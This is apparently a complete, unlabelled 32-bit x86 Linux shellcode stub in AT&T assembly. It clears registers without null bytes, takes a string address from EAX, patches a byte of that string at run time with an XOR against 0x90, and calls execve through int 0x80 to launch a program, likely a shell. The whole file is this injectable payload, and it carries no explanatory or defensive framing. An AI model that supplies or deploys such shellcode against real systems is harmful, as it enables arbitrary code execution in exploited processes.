.global _start

.text

_start:
	xor	%ebx, %ebx
	xor	%edx, %edx
	xor	%ecx, %ecx
	or	%eax, %ebx
	or	%ebx, %ecx
	add	$7, %ecx
	xor	%eax, %eax
	xorb	$0x90, (%ecx)
	xor	%ecx, %ecx
	mov	$0xb, %al
	int	$0x80
